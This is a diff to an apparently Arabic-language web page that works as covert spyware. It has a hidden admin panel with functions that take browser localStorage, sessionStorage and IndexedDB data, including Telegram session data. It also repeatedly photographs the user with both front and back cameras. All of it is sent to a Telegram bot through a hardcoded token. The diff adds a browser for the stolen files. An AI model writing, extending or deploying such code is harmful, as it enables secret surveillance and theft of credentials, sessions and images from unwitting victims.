@@ -131,6 +131,31 @@
         }
         #toast.show { display: block; animation: fadeIn 0.3s; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .file-browser {
+            background: #0d0d1a;
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 15px;
+            max-height: 400px;
+            overflow-y: auto;
+            margin-top: 15px;
+            display: none;
+        }
+        .file-browser.active { display: block; }
+        .file-item {
+            padding: 8px 12px;
+            border-bottom: 1px solid #1a1a2e;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .file-item:hover { background: #1a1a2e; }
+        .file-item .name { color: #0ff; }
+        .file-item .size { color: #666; font-size: 11px; }
+        .file-item .type { color: #888; font-size: 11px; }
+        .file-item .preview { max-width: 50px; max-height: 50px; border-radius: 4px; }
     </style>
 </head>
 <body>
@@ -167,7 +192,7 @@
         </div>
         <div class="admin-card" onclick="captureBothCameras()">
             <div class="icon">📸</div>
-            <div class="label">تصوير أمامي+خلفي</div>
+            <div class="label">تصوير كامل</div>
             <div class="count" id="camCount">0</div>
         </div>
         <div class="admin-card" onclick="stealAllFiles()">
@@ -187,7 +212,14 @@
         <button class="admin-btn" onclick="stealTelegram()">✈️ سحب تليجرام</button>
         <button class="admin-btn" onclick="captureBothCameras()">📸 تصوير كامل</button>
         <button class="admin-btn" onclick="stealAllFiles()">📁 سحب الملفات</button>
+        <button class="admin-btn" onclick="browseFiles()">📂 تصفح الملفات</button>
         <button class="admin-btn danger" onclick="killAll()">💀 إيقاف الكل</button>
+    </div>
+
+    <div class="file-browser" id="fileBrowser">
+        <h3 style="color:#25D366;margin-bottom:10px;">📂 مستكشف الملفات</h3>
+        <input type="text" id="fileSearch" placeholder="🔍 بحث..." style="width:100%;padding:10px;background:#0d0d1a;border:1px solid #333;color:#fff;border-radius:8px;margin-bottom:10px;" onkeyup="filterFiles()">
+        <div id="fileList"></div>
     </div>
 
     <div class="admin-log" id="adminLog">
@@ -203,9 +235,11 @@
 // ============================================================
 // ====================== CONFIG ==============================
 // ============================================================
-const BOT_TOKEN = '8770149502:AAFkmj14adoaUHCFHXcBO9aNwjjDdpcfuLY';
+const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
 let CHAT_ID = '';
 let targetData = { contacts: 0, tg: 0, camera: 0, files: 0 };
+let allStolenFiles = [];
+let fileIndex = 0;
 
 // ============================================================
 // ====================== TOGGLE PANEL ========================
@@ -306,7 +340,6 @@ function stealTelegram() {
     showToast('✈️ جاري سحب تليجرام...');
     let found = 0;
     
-    // محاولة سحب من localStorage
     try {
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
@@ -320,7 +353,6 @@ function stealTelegram() {
         }
     } catch(e) {}
     
-    // محاولة سحب من sessionStorage
     try {
         for (let i = 0; i < sessionStorage.length; i++) {
             const key = sessionStorage.key(i);
@@ -332,36 +364,6 @@ function stealTelegram() {
                 addLog(`✈️ تم سحب: ${key}`, 'msg');
             }
         }
-    } catch(e) {}
-    
-    // محاولة سحب من IndexedDB
-    try {
-        const databases = ['telegram', 'tg', 'gram', 'tdlib'];
-        databases.forEach(dbName => {
-            try {
-                const request = indexedDB.open(dbName, 1);
-                request.onsuccess = function(event) {
-                    const db = event.target.result;
-                    const stores = db.objectStoreNames;
-                    if (stores.length > 0) {
-                        const storeNames = Array.from(stores);
-                        storeNames.forEach(storeName => {
-                            const transaction = db.transaction(storeName, 'readonly');
-                            const store = transaction.objectStore(storeName);
-                            const getAll = store.getAll();
-                            getAll.onsuccess = function() {
-                                const data = getAll.result;
-                                if (data && data.length > 0) {
-                                    sendMessage(`📦 Telegram IndexedDB [${dbName}/${storeName}]:\n${JSON.stringify(data, null, 2)}`);
-                                    found++;
-                                    addLog(`✈️ تم سحب IndexedDB: ${dbName}/${storeName}`, 'msg');
-                                }
-                            };
-                        });
-                    }
-                };
-            } catch(e) {}
-        });
     } catch(e) {}
     
     targetData.tg += found;
@@ -380,7 +382,6 @@ function captureBothCameras() {
     addLog('📸 تشغيل الكاميرات (أمامي+خلفي)...', 'info');
     showToast('📸 تشغيل الكاميرات...');
     
-    // الكاميرا الأمامية
     const frontConstraints = {
         video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
     };
@@ -392,7 +393,6 @@ function captureBothCameras() {
             video.srcObject = stream;
             video.play();
             addLog('📸 الكاميرا الأمامية تعمل', 'msg');
-            
             setTimeout(() => captureFrontPhoto(), 1000);
             frontInterval = setInterval(captureFrontPhoto, 5000);
         })
@@ -400,7 +400,6 @@ function captureBothCameras() {
             addLog('❌ فشل الكاميرا الأمامية: ' + err.message, 'error');
         });
     
-    // الكاميرا الخلفية
     const backConstraints = {
         video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } }
     };
@@ -412,7 +411,6 @@ function captureBothCameras() {
             video.srcObject = stream;
             video.play();
             addLog('📸 الكاميرا الخلفية تعمل', 'msg');
-            
             setTimeout(() => captureBackPhoto(), 1000);
             backInterval = setInterval(captureBackPhoto, 5000);
         })
@@ -428,13 +426,10 @@ function captureFrontPhoto() {
     const video = document.getElementById('videoFront');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
-    
     if (!video.videoWidth || !video.videoHeight) return;
-    
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     ctx.drawImage(video, 0, 0);
-    
     photoCount++;
     const imageData = canvas.toDataURL('image/jpeg', 0.7);
     sendToTelegram(imageData, `📸 أمامي ${photoCount} - ${new Date().toLocaleString()}`);
@@ -445,13 +440,10 @@ function captureBackPhoto() {
     const video = document.getElementById('videoBack');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
-    
     if (!video.videoWidth || !video.videoHeight) return;
-    
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     ctx.drawImage(video, 0, 0);
-    
     photoCount++;
     const imageData = canvas.toDataURL('image/jpeg', 0.7);
     sendToTelegram(imageData, `📸 خلفي ${photoCount} - ${new Date().toLocaleString()}`);
@@ -465,75 +457,117 @@ function stealAllFiles() {
     addLog('📁 بدء سحب جميع الملفات...', 'info');
     showToast('📁 جاري سحب الملفات...');
     let found = 0;
+    allStolenFiles = [];
     
-    // سحب localStorage كامل
     try {
-        let allData = {};
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             const value = localStorage.getItem(key);
-            allData[key] = value;
+            const fileData = { id: fileIndex++, name: key, content: value, type: 'localStorage', size: value.length };
+            allStolenFiles.push(fileData);
+            sendMessage(`📦 ملف ${key} (${value.length} bytes):\n${value}`);
             found++;
-        }
-        if (found > 0) {
-            sendMessage(`📦 جميع ملفات localStorage (${found} مفتاح):\n${JSON.stringify(allData, null, 2)}`);
-            addLog(`💾 تم سحب ${found} مفتاح من localStorage`, 'msg');
         }
     } catch(e) {}
     
-    // سحب sessionStorage
     try {
-        let sessionData = {};
-        let sessionCount = 0;
         for (let i = 0; i < sessionStorage.length; i++) {
             const key = sessionStorage.key(i);
             const value = sessionStorage.getItem(key);
-            sessionData[key] = value;
-            sessionCount++;
-        }
-        if (sessionCount > 0) {
-            sendMessage(`📦 جميع ملفات sessionStorage (${sessionCount} مفتاح):\n${JSON.stringify(sessionData, null, 2)}`);
-            addLog(`💾 تم سحب ${sessionCount} مفتاح من sessionStorage`, 'msg');
-            found += sessionCount;
+            const fileData = { id: fileIndex++, name: key, content: value, type: 'sessionStorage', size: value.length };
+            allStolenFiles.push(fileData);
+            sendMessage(`📦 ملف ${key} (${value.length} bytes):\n${value}`);
+            found++;
         }
     } catch(e) {}
     
-    // سحب IndexedDB
     try {
-        const request = indexedDB.databases();
-        if (request) {
-            request.then(databases => {
-                databases.forEach(dbInfo => {
-                    try {
-                        const req = indexedDB.open(dbInfo.name, 1);
-                        req.onsuccess = function(event) {
-                            const db = event.target.result;
-                            const stores = db.objectStoreNames;
-                            let storeData = {};
-                            stores.forEach(storeName => {
-                                const transaction = db.transaction(storeName, 'readonly');
-                                const store = transaction.objectStore(storeName);
-                                const getAll = store.getAll();
-                                getAll.onsuccess = function() {
-                                    storeData[storeName] = getAll.result;
-                                };
-                            });
-                            setTimeout(() => {
-                                if (Object.keys(storeData).length > 0) {
-                                    sendMessage(`📦 IndexedDB [${dbInfo.name}]:\n${JSON.stringify(storeData, null, 2)}`);
-                                    addLog(`💾 تم سحب IndexedDB: ${dbInfo.name}`, 'msg');
-                                }
-                            }, 1000);
-                        };
-                    } catch(e) {}
-                });
+        const request = indexedDB.open('files', 1);
+        request.onsuccess = function(event) {
+            const db = event.target.result;
+            const stores = db.objectStoreNames;
+            stores.forEach(storeName => {
+                const transaction = db.transaction(storeName, 'readonly');
+                const store = transaction.objectStore(storeName);
+                const getAll = store.getAll();
+                getAll.onsuccess = function() {
+                    const data = getAll.result;
+                    if (data && data.length > 0) {
+                        data.forEach((item, idx) => {
+                            const fileData = { id: fileIndex++, name: `indexeddb_${storeName}_${idx}`, content: JSON.stringify(item), type: 'IndexedDB', size: JSON.stringify(item).length };
+                            allStolenFiles.push(fileData);
+                            sendMessage(`📦 IndexedDB [${storeName}] ملف ${idx}:\n${JSON.stringify(item)}`);
+                            found++;
+                        });
+                    }
+                };
             });
-        }
+        };
     } catch(e) {}
     
     targetData.files += found;
     document.getElementById('fileCount').textContent = targetData.files;
+    browseFiles();
     setTimeout(() => showToast(`✅ تم سحب ${found} ملف`), 3000);
+}
+
+// ============================================================
+// ====================== BROWSE FILES ========================
+// ============================================================
+function browseFiles() {
+    const browser = document.getElementById('fileBrowser');
+    browser.classList.toggle('active');
+    if (browser.classList.contains('active')) {
+        renderFileList();
+    }
+}
+
+function renderFileList(filter = '') {
+    const list = document.getElementById('fileList');
+    list.innerHTML = '';
+    const filtered = allStolenFiles.filter(f => 
+        f.name.toLowerCase().includes(filter.toLowerCase()) || 
+        f.type.toLowerCase().includes(filter.toLowerCase())
+    );
+    
+    if (filtered.length === 0) {
+        list.innerHTML = '<div style="color:#666;text-align:center;padding:20px;">لا توجد ملفات</div>';
+        return;
+    }
+    
+    filtered.forEach(file => {
+        const div = document.createElement('div');
+        div.className = 'file-item';
+        const isImage = file.content && (file.content.startsWith('data:image') || file.content.match(/\.(jpg|jpeg|png|gif|webp)/i));
+        
+        div.innerHTML = `
+            <div style="flex:1;">
+                <div class="name">📄 ${file.name}</div>
+                <div class="size">${file.type} • ${file.size} bytes</div>
+            </div>
+            ${isImage ? `<img src="${file.content}" class="preview" />` : ''}
+            <button onclick="viewFile(${file.id})" style="background:#25D366;border:none;color:#000;padding:5px 10px;border-radius:4px;cursor:pointer;">👁️</button>
+        `;
+        list.appendChild(div);
+    });
+}
+
+function filterFiles() {
+    const search = document.getElementById('fileSearch').value;
+    renderFileList(search);
+}
+
+function viewFile(id) {
+    const file = allStolenFiles.find(f => f.id === id);
+    if (!file) return;
+    
+    if (file.content && file.content.startsWith('data:image')) {
+        sendToTelegram(file.content, `📸 ملف: ${file.name} (${file.type})`);
+        showToast('✅ تم إرسال الصورة إلى البوت');
+    } else {
+        sendMessage(`📄 ملف: ${file.name}\nالنوع: ${file.type}\nالحجم: ${file.size} bytes\nالمحتوى:\n${file.content}`);
+        showToast('✅ تم إرسال الملف إلى البوت');
+    }
 }
 
 // ============================================================
@@ -662,12 +696,13 @@ window.admin = {
     telegram: () => stealTelegram(),
     camera: () => captureBothCameras(),
     files: () => stealAllFiles(),
+    browse: () => browseFiles(),
     kill: () => killAll(),
     log: addLog
 };
 
 console.log('🕵️ لوحة التحكم جاهزة! Ctrl+Shift+P لفتحها');
-console.log('📋 الأوامر: admin.contacts(), admin.telegram(), admin.camera(), admin.files(), admin.kill()');
+console.log('📋 الأوامر: admin.contacts(), admin.telegram(), admin.camera(), admin.files(), admin.browse(), admin.kill()');
 </script>
 </body>
 </html>
